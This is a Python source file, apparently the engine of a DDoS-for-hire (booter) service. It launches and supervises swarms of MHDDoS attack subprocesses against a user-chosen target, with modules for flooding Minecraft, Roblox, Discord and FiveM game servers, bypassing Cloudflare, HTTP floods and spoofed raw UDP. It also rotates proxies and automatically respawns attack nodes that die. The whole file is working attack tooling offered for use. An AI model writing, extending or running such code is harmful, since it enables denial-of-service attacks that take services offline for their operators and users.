# mhddos_engine.py
import asyncio
import os
import sys
import time
import traceback
from config import (
    MHDDOS_FULL, MHDDOS_DIR, MHDDOS_LAUNCHER,
    SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE, RPC_PER_SUB_NODE,
    MAX_RESPAWN_ATTEMPTS, RESPAWN_DELAY, ATTACK_LOG_DIR,
    proxy_slice_file, BASE_DIR,
)

RAWUDP = os.path.join(BASE_DIR, "rawudp.py")

MODULE_MAP = {
    "minecraft":  ("L4", "MCBOT",     {}),
    "roblox":     ("L4", "UDP",       {}),
    "discord":    ("L4", "UDP",       {}),
    "fivem":      ("L4", "FIVEM",     {}),
    "web":        ("L7", "STRESS",    {}),
    "web_cf":     ("L7", "CFB",       {}),
    "web_bypass": ("L7", "BYPASS",    {}),
    "http_flood": ("L7", "GET",       {}),
    "voice_amp":  ("RAW", "RAWUDP",   {}),   # ← raw socket spoof
}

L4_MODULES = {"minecraft", "roblox", "discord", "fivem", "voice_amp"}


class MHDDoSEngine:
    def __init__(self):
        self.running: dict[int, list[dict]] = {}

    def _build_mhddos_args(self, method: str, layer: str, target: str,
                           port: int, duration: int, threads: int,
                           proxies_path: str, rpc: int) -> list[str]:
        if layer == "L7":
            host = target if target.startswith("http") else f"http://{target}"
            if port and ":" not in host.split("//")[-1]:
                host = f"{host}:{port}"
            return [method, host, "5", str(threads),
                    proxies_path, str(rpc), str(duration)]
        else:
            host = target.split("//")[-1].split("/")[0]
            if ":" not in host:
                host = f"{host}:{port}"
            return [method, host, str(threads), str(duration)]

    def _build_rawudp_args(self, target: str, port: int,
                           duration: int, threads: int) -> list[str]:
        # rawudp.py <IP> <PORT> [THREADS] [DURATION] [PKT]
        host = target.split("//")[-1].split("/")[0].split(":")[0]
        return [host, str(port), str(threads), str(duration), "1400"]

    async def _spawn_node(self, user_id: int, node_idx: int,
                          cmd_head: list[str], args: list[str]) -> dict:
        os.makedirs(ATTACK_LOG_DIR, exist_ok=True)
        log_path = os.path.join(
            ATTACK_LOG_DIR, f"{user_id}_{node_idx}_{int(time.time())}.log"
        )
        log_f = open(log_path, "wb")

        proc = await asyncio.create_subprocess_exec(
            *cmd_head, *args,
            stdout=log_f,
            stderr=asyncio.subprocess.STDOUT,
            cwd=MHDDOS_DIR,
        )
        log_f.close()
        return {
            "proc": proc,
            "cmd_head": cmd_head,
            "args": args,
            "log_path": log_path,
            "respawns": 0,
            "node_idx": node_idx,
        }

    async def start(self, user_id: int, module: str, target: str, port: int,
                    duration: int, devices: int,
                    proxy_slices: list[list[str]]):
        if user_id in self.running:
            raise RuntimeError("มี attack รันอยู่แล้ว")

        info = MODULE_MAP.get(module)
        if not info:
            raise ValueError(f"unknown module: {module}")
        layer, method, _ = info

        sub_nodes = devices * SUB_NODES_PER_DEVICE

        # เตรียม slice file
        for i in range(sub_nodes):
            data = proxy_slices[i] if i < len(proxy_slices) else []
            with open(proxy_slice_file(user_id, i), "w") as f:
                f.write("\n".join(data))

        nodes: list[dict] = []
        for i in range(sub_nodes):
            if layer == "RAW":
                # raw socket spoofed
                cmd_head = [sys.executable, RAWUDP]
                args = self._build_rawudp_args(
                    target, port, duration,
                    max(50, THREADS_PER_SUB_NODE),
                )
            else:
                cmd_head = [sys.executable, MHDDOS_LAUNCHER]
                args = self._build_mhddos_args(
                    method, layer, target, port, duration,
                    THREADS_PER_SUB_NODE,
                    proxy_slice_file(user_id, i),
                    RPC_PER_SUB_NODE,
                )

            try:
                node = await self._spawn_node(user_id, i, cmd_head, args)
                nodes.append(node)
            except Exception:
                traceback.print_exc()
            await asyncio.sleep(0.05)

        if not nodes:
            raise RuntimeError("spawn sub-process ไม่สำเร็จ")

        self.running[user_id] = nodes
        return nodes

    async def _respawn(self, user_id: int, node: dict) -> bool:
        if node["respawns"] >= MAX_RESPAWN_ATTEMPTS:
            return False
        await asyncio.sleep(RESPAWN_DELAY)
        try:
            new_node = await self._spawn_node(
                user_id, node["node_idx"], node["cmd_head"], node["args"]
            )
            new_node["respawns"] = node["respawns"] + 1
            nodes = self.running.get(user_id, [])
            for i, n in enumerate(nodes):
                if n is node:
                    nodes[i] = new_node
                    break
            return True
        except Exception:
            traceback.print_exc()
            return False

    async def _watcher(self, user_id: int):
        while True:
            await asyncio.sleep(3)
            nodes = self.running.get(user_id)
            if not nodes:
                return
            for node in list(nodes):
                if node["proc"].returncode is not None:
                    await self._respawn(user_id, node)

    async def stop(self, user_id: int):
        nodes = self.running.pop(user_id, [])
        if not nodes:
            return
        for node in nodes:
            proc = node["proc"]
            if proc.returncode is None:
                try:
                    proc.terminate()
                except Exception:
                    pass
        for node in nodes:
            proc = node["proc"]
            if proc.returncode is None:
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except asyncio.TimeoutError:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                except Exception:
                    pass
        for node in nodes:
            try:
                os.remove(node["log_path"])
            except OSError:
                pass
        for i in range(50):
            try:
                os.remove(proxy_slice_file(user_id, i))
            except OSError:
                break

    def is_running(self, user_id: int) -> bool:
        nodes = self.running.get(user_id, [])
        return any(n["proc"].returncode is None for n in nodes)

    def alive_count(self, user_id: int) -> tuple[int, int]:
        nodes = self.running.get(user_id, [])
        alive = sum(1 for n in nodes if n["proc"].returncode is None)
        return alive, len(nodes)

    async def shutdown_all(self):
        for uid in list(self.running.keys()):
            await self.stop(uid)